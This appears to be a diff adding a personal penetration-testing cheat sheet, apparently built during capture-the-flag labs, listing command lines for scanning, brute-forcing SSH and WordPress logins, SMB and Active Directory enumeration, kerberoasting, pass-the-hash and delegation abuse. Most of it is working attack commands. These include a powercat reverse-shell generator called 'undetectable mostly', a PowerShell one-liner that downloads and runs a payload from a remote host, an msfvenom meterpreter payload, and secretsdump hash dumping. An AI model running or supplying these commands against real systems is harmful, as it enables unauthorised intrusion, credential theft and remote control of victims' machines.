@@ -1,0 +1,181 @@
+nmap : 
+
+	nmap -sC -sV -oN <output file> <host> 
+
+gobuster:
+
+	gobuster dir -u <url> -w <wordlist> 
+	
+hydra: 
+
+	hydra -l <username> -P <password_list> -t <tasks> <host> ssh
+	hydra -L <usernames list> -p <password> -t <tasks> <host> ssh
+	hydra -L <usernames list> -P <password_list> -t <tasks> <host> ssh
+
+nikto:
+
+	nikto --url <url> 
+
+steghide: 
+	
+	steghide extract -sf <file to extract> 
+	
+binwalk: 
+	
+	binwalk <file>
+	binwalk -e <file to extract>
+
+stegcracker: 
+
+	stegcracker <file to crack> 
+	
+scp:
+
+	scp <local file path> <ssh username>@<remote host>:<path to save on remote host>
+
+smbclient: 
+
+	smbclient -L //<hostname> -U users --> list all shares.
+	smclient //<hostname>/<share name> --> connect to smb share. 	
+	
+enum4linux:
+
+	enum4linux <url/hostname>
+	
+hashcat:
+
+	hashcat --stdout -r <path to best64.rule> <origin pass file> -o <output file name> - generate pasword with rules (cind of cipher)	
+
+
+mysql: 
+
+	mysql -h <hostname> -u <username> -p
+
+
+powercat: 
+
+	powercat -c <lhost> -p <lport> -e cmd -g > payload.ps1 -> generate a powershell reverse shell payload (undetectable mostly) for windows.
+	
+
+powershell: 
+
+	powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://10.14.65.5/payload.ps1') --> load powershell script to memory and run it.
+	
+msfvenom:
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=<listening port> -f exe -o reverse.exe
+	
+
+xfreerdp:
+
+	xfreerdp /u:<username> /p:<password> /cert:ignore /v:<RHOS> /dynamic-resolution
+
+rdesktop:
+
+	rdesktop -u "" 10.10.186.19 --> get to logon screen.
+
+socat:
+	
+	socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80 --> if there is a port listening only in the target host on port 80 this command will forward the service to port 8080 so i can access the service from my attacking machine.
+
+ss:
+	ss -tuln --> list all listenning ports. 
+	
+smb:
+
+	smbclient -L //<server name> --> list all shares
+	smclient //<server nmae>/<share name> --> connect to spesific share (no password)
+	smbmap -u <username> -p <password> -r -H <ip address> --> map smb shares in a readable format.
+	
+	crackmapexec:
+	
+		crackmapexec smb <ip_addr> -u 'guest' -p '' --rid-brute --> if IPC$ share is accessable it possible to enumerate usernames with crackmapexec.
+		impacket-lookupsid 'anonymous:'@10.10.125.79 | cut -d " " -f 2 > usernames.txt --> another way to enumerate users and save it to a formated correctlly file.
+		crackmapexec smb <ip_addr> -u <userName> -p "<password>" -M spider_plus -o READ_ONLY=true --> get all the accessible shares and thire content with a valid credentials (or null if permittted).
+		crackmapexec smb <ip_addr> -u <userName> -p "<password>" --> check credentials if valid for remoat code execute. if result - Pwnd it is possible!. 
+		crackmapexec smb <ip_addr> -u <userName> -p "<password>" --exec-method smbexec -x "<command to execute>" --> execute command using valid credentials
+		crackmapexec smb <ip_addr> -u username -p <passwords file> --> brute force asm login
+
+wordpress: 
+	
+	hydra -L <usernames list> -P <passwords list> <hostname> http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+	
+getcap:
+
+	getcap -r / 2>/dev/null -> find binaries with capabilitys 
+	
+special binary call:
+	
+	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash 
+
+redis server: 
+
+	redis-cli -h <redis server ip> --> connect to a redis server. 
+	
+	inside the cli:
+	
+		info --> information about the server. 
+		keys * --> return all the keys in the databse. 
+		use <db id> --> switch database.
+		select <key> --> view key value. 
+		config get * --> get all the server configurations. 
+		
+	read and write files to the server: 
+		
+		eval “dofile(‘C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt’)” 0 --> read/execute file . 
+		eval “dofile(‘//10.8.247.255.//kali’)” 0 --> example to get some remoat file (to catch smb authentication for example) 
+		
+responder:
+
+	responder -I <interface> -dvw --> start responder.	
+
+LDAP: 
+	ldapdomaindump <target_ip> -u '<domain\username>' -p '<password>' --> dump the domain inforamation (users computers groups etc) in a json and html format (dump to current working directory).
+	
+Delegation user:
+	
+	impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.186.19 --> if user have the TRUSTED_TO_AUTH_FOR_DELEGATION set then this will get more information about the delagation. 
+	
+	output shuld look like this: 
+		AccountName     AccountType  DelegationType                      DelegationRightsTo                  
+		--------------  -----------  ----------------------------------  -----------------------------------
+		password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
+		password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
+		password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
+		password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
+		password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS
+		
+	impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.186.19 --> If the account is configured with constrained delegation (with protocol transition), we 			
+																		  can request service tickets for other users, assuming the target SPN is allowed for 
+																		  delegation. The output of this script will be a service ticket for the Administrator 
+																		  user (Administratort.ccache).
+	EXPORT KRB5CCNAME=Administratort.ccache --> load the ticket to memory so we can use it to dump the hashes from the target. 
+	impacket-secretsdump -k -no-pass DC.COOCTUS.CORP --> dump the hashes. 
+	
+kerberos: 
+
+	impacket-GetNPUsers vulnnet-rst.local/ -dc-ip <target ip> -usersfile <usernames file> -no-pass -request -outputfile <output file name> --> get kerberos ticket with only list of usernames , if any have the privilege “Does not 
+																		   require Pre-Authentication” set
+	
+	impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889*' -request -dc-ip <domain controller ip> --> after get a valid set of credentials we can try to find some service running under users and the hash for the user . 
+
+kerbrute:
+
+	kerbrute userenum -d <Domain_Name> --dc <Domain_Controller_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --> enum for valid usernames. 
+
+evil-winrm:	
+	evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.34.213 -N --> connect to the target system with valid credentials
+	
+	evil-winrm -u <UserName> -H <nthash>  -i vulnnet-rst.local -N --> pass-the-hash with evilwinrm
+	
+bloodhound:
+	
+	bloodhound-python -c All,LoggedOn -u "t-skid" -p "tj072889*" -d VULNNET-RST.LOCAL -ns 10.10.252.254 --> get a graph of the domain users and groups with just the domain name dc ip and a valid set of credentials.
+	
+php LFI:
+
+	php://filter/convert.base64-encode/resource=index.php --> get base64 of the source php code. 	
+	
+lsattr: 
+
+	lsattr <file/directory> --> revile more permissions on a file . 
